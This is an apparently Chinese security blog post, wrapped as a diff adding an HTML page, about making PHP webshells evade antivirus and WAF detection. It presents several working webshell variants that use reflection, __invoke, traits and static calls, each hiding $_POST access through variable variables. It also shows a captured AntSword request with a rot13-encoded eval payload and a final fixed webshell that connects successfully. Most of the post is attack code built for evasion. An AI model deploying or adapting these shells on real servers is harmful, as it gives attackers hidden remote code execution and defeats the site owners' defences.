@@ -1,0 +1,201 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="c0a617de563e3c2d5fee797615d0ddb5">前言</h1>
+<p>继上一篇Webshell免杀已经过去很久了，之前的工作只是完成了落地免杀和命令的执行，如果我们直接传参进行命令执行的话会很容易被WAF拦截。蚁剑有编码器这一功能可以方便我们绕过WAF的检测。<br/>
+后来一次使用webshell过程中发现其并不能连接蚁剑，决定抓包简单分析一下流量修改我们的webshell。<br/>
+</p>
+<h1 data-content="1" id="ac68af7e3b8ac5bb279d42d7e23aa483">trick</h1>
+<p>上一篇只是提到了php中大家比较少用的tricks，所以这一次分享几个之前总结的一些成果。</p>
+<h2 data-content="1" id="8e036d30b0704a85534b47d1bbb0e861">ReflectionClass::newInstance</h2>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+
+<span class="k">class</span> <span class="nc">Test1</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$para</span><span class="p">,</span> <span class="nv">$_value</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$para</span><span class="p">(</span><span class="nv">$_value</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+
+<span class="nv">$class1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionClass</span><span class="p">(</span><span class="s2">"Test1"</span><span class="p">);</span>
+
+<span class="k">foreach</span> <span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'_POST'</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$_r1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$$_r1</span> <span class="k">as</span> <span class="nv">$_asadasd</span><span class="o">=&gt;</span><span class="nv">$_wfwefb</span><span class="p">)</span> <span class="p">{</span>
+
+                    <span class="nv">$$_asadasd</span> <span class="o">=</span><span class="nv">$_wfwefb</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$class2</span> <span class="o">=</span> <span class="nv">$class1</span><span class="o">-&gt;</span><span class="na">newInstance</span><span class="p">(</span><span class="nv">$_asadasd</span><span class="p">,</span> <span class="nv">$$_asadasd</span><span class="p">);</span>
+</pre></div>
+<p>我们首先初始化一个反射类，传入要实例化类的类名，接下来用<code>newInstance()</code>方法对该类进行实例化。</p>
+<ol>
+<li>我们的webshell需要接收两个参数，一个是<code>函数</code>，另一个是<code>函数的参数</code>，这里借用<code>@郑瀚AndrewHann</code>师傅的<a href="https://zhuanlan.zhihu.com/p/197553954" target="_blank">污点传递理论</a>
+</li>
+</ol>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210220004720-21e6f37c-72d2-1.png"/></p>
+<ol>
+<li>接下来就是在构造函数内部执行命令，执行命令的方式是使用可变函数。当函数名被传入<code>$para=assert</code>时，构造函数内变为<code>assert($_value)</code>。函数的参数即我们要执行的命令。</li>
+<li>最后解决参数的传递。常见的<code>$_GET[]、$_POST[]、$_COOKIE[]...</code>数组无法直接使用。我们依然利用PHP的动态特性，使webshell不出现<code>$_GET[]、$_POST[]、$_COOKIE[]...</code>。当程序执行到第二个foreach循环之前。我们的输入并没有参数来接收，直到我们使用可变变量<code>变</code>出了<code>$_POST[]</code>，并将其键值进一步操作后传入<code>newInstance</code>函数。</li>
+</ol>
+<hr/>
+<p>上面这个webshell依然可以进行变形。</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">Test1</span>
+<span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$para1</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$para2</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">(</span><span class="nv">$para1</span><span class="p">,</span> <span class="nv">$para2</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$para1</span><span class="p">(</span><span class="nv">$para2</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$para1</span><span class="p">,</span> <span class="nv">$para2</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="p">(</span><span class="nv">$para1</span><span class="p">,</span> <span class="nv">$para2</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$class1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionClass</span><span class="p">(</span><span class="s2">"Test1"</span><span class="p">);</span>
+
+<span class="k">foreach</span> <span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'_POST'</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$_r1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$$_r1</span> <span class="k">as</span> <span class="nv">$_asadasd</span><span class="o">=&gt;</span><span class="nv">$_wfwefb</span><span class="p">)</span> <span class="p">{</span>
+
+                    <span class="nv">$$_asadasd</span> <span class="o">=</span><span class="nv">$_wfwefb</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$class2</span> <span class="o">=</span> <span class="nv">$class1</span><span class="o">-&gt;</span><span class="na">newInstance</span><span class="p">(</span><span class="nv">$_asadasd</span><span class="p">,</span> <span class="nv">$$_asadasd</span><span class="p">);</span>
+</pre></div>
+<ul>
+<li>
+<code>__invoke</code>：当尝试以调用函数的方式调用一个对象时，该方法会被自动调用。<br/>
+所以我们在构造函数内调用一次对象：<code>$this($p1,$p2)</code>，接着会调用<code>__invoke()</code>函数实现命令执行。</li>
+</ul>
+<h2 data-content="1" id="379098ea2848f1f31403db236a8ddfe8">trait(PHP 7)</h2>
+<p>php从以前到现在一直都是单继承的语言，无法同时从<strong>两个基类中继承属性和方法</strong>，为了解决这个问题，php出了<code>Trait</code>这个特性</p>
+<ul>
+<li>用法：通过在类中使用<code>use</code>关键字，声明要组合的Trait名称，具体的Trait的声明使用Trait关键词，<strong>Trait不能实例化</strong>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+
+<span class="k">trait</span> <span class="nx">Dog</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$name</span><span class="o">=</span><span class="s2">"dog"</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">drive</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"This is dog drive"</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">eat</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$a</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">Animal</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">drive</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"This is animal drive"</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">eat</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"This is animal eat"</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">Cat</span> <span class="k">extends</span> <span class="nx">Animal</span>
+<span class="p">{</span>
+    <span class="k">use</span> <span class="nx">Dog</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">drive</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"This is cat drive"</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">foreach</span> <span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'_POST'</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$_request</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$$_request</span> <span class="k">as</span> <span class="nv">$_key</span><span class="o">=&gt;</span><span class="nv">$_value</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$$_key</span><span class="o">=</span>  <span class="nv">$_value</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+
+<span class="nv">$cat</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Cat</span><span class="p">();</span>
+<span class="nv">$cat</span><span class="o">-&gt;</span><span class="na">eat</span><span class="p">(</span><span class="nv">$_key</span><span class="p">,</span> <span class="nv">$_value</span><span class="p">);</span>
+</pre></div>
+<ul>
+<li>我们的参数依旧将键值数组中的<code>键</code>、<code>值</code>分别传入。函数调用则使用PHP 7中的<code>trait</code>特性，最终实现可变函数的执行</li>
+</ul>
+<h2 data-content="1" id="d49c6992650d09cf77340b56b59aae79">静态调用非静态函数</h2>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">SimpleThis</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">NonStatic</span><span class="p">(</span><span class="nv">$p1</span><span class="p">,</span> <span class="nv">$p2</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$this</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s1">'6'</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$p1</span><span class="p">(</span><span class="nv">$p2</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">foreach</span> <span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'_POST'</span><span class="p">,</span><span class="s1">'_GET'</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$_request</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$$_request</span> <span class="k">as</span> <span class="nv">$_key</span><span class="o">=&gt;</span><span class="nv">$_value</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$$_key</span><span class="o">=</span>  <span class="nv">$_value</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nx">SimpleThis</span><span class="o">::</span><span class="na">NonStatic</span><span class="p">(</span><span class="nv">$_key</span><span class="p">,</span> <span class="nv">$_value</span><span class="p">);</span>
+</pre></div>
+<p>在C、Java中，非静态函数肯定是不能被静态调用的。首先会编译失败。但是PHP是个解释函数。至于原理：这里直接附上鸟哥的<a href="https://www.laruence.com/2012/06/14/2628.html" target="_blank">文章</a></p>
+<h1 data-content="1" id="92402091d851217428f6f1686c16d62a">连接蚁剑</h1>
+<p>将蚁剑挂上burpsuite。上传我们的一句话木马进行连接。</p>
+<ul>
+<li>请求的流量</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210220004742-2f4433ae-72d2-1.png"/></p>
+<pre><code>assert=@eval(@str_rot13($_POST[ca3a283bf3d534]));&amp;ca3a283bf3d534=@vav_frg("qvfcynl_reebef", "0");@frg_gvzr_yvzvg(0);shapgvba nfrap($bhg){erghea $bhg;};shapgvba nfbhgchg(){$bhgchg=bo_trg_pbagragf();bo_raq_pyrna();rpub "ron28298";rpub @nfrap($bhgchg);rpub "9741440r5";}bo_fgneg();gel{$Q=qveanzr($_FREIRE["FPEVCG_SVYRANZR"]);vs($Q=="")$Q=qveanzr($_FREIRE["CNGU_GENAFYNGRQ"]);$E="{$Q}    ";vs(fhofge($Q,0,1)!="/"){sbernpu(enatr("P","M")nf $Y)vs(vf_qve("{$Y}:"))$E.="{$Y}:";}ryfr{$E.="/";}$E.="   ";$h=(shapgvba_rkvfgf("cbfvk_trgrtvq"))?@cbfvk_trgcjhvq(@cbfvk_trgrhvq()):"";$f=($h)?$h["anzr"]:@trg_pheerag_hfre();$E.=cuc_hanzr();$E.="   {$f}";rpub $E;;}pngpu(Rkprcgvba $r){rpub "REEBE://".$r-&gt;trgZrffntr();};nfbhgchg();qvr();</code></pre>
+<ul>
+<li>可以得到webshell执行的内容为：<code>assert(@eval(@str_rot13($_POST[ca3a283bf3d534]));)</code>，接着<code>&amp;ca3a283bf3d534=xxxx</code>为我们的第二个POST参数<br/>
+所以实际上webshell执行的是第二个随机参数的值。</li>
+<li>回显</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210220004751-3482efae-72d2-1.png"/></p>
+<p><code>Call to undefined function ca3a283bf3d534()</code>这里报错未定义的函数，很显然我们的可变函数的函数名被覆盖了。并没有执行<code>assert()</code>，达到预期的结果。<br/>
+实际上我们需要的是第一个POST参数即我们传入的assert。所以我们的webshell在循环数组时，造成了变量覆盖，后来的参数覆盖了前一个值。在webshell中我们需要取第一个值再传递它即可。</p>
+<h2 data-content="1" id="f76d88f70acdbb7c620140b8c64c1708">修改</h2>
+<p>以第一个webshell为例：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$s0</span><span class="p">;</span>
+<span class="nv">$s1</span><span class="p">;</span>
+
+
+<span class="k">class</span> <span class="nc">Test1</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$para</span><span class="p">,</span> <span class="nv">$_value</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$para</span><span class="p">(</span><span class="nv">$_value</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+
+
+<span class="nv">$class1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionClass</span><span class="p">(</span><span class="s2">"Test1"</span><span class="p">);</span>
+<span class="nb">print_r</span><span class="p">(</span><span class="nv">$class1</span><span class="p">);</span>
+<span class="k">foreach</span> <span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'_POST'</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$_request</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$$_request</span> <span class="k">as</span> <span class="nv">$_key</span><span class="o">=&gt;</span><span class="nv">$_value</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">1</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="err">$</span><span class="p">{</span><span class="s2">"s"</span><span class="o">.</span><span class="nv">$i</span><span class="p">}</span> <span class="o">=</span> <span class="nv">$_key</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$class2</span> <span class="o">=</span> <span class="nv">$class1</span><span class="o">-&gt;</span><span class="na">newInstance</span><span class="p">(</span><span class="nv">$s0</span><span class="p">,</span> <span class="nv">$_value</span><span class="p">);</span>
+</pre></div>
+<p>我们依然使用可变变量的方式获取参数的值。我们循环一次将函数名取出，再传递即可。</p>
+<h1 data-content="1" id="9c968c5947c878b7eea0e0949ff6750a">最后</h1>
+<p>success!<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210220004800-39c5face-72d2-1.png"/></p>
+</div>
+</div>
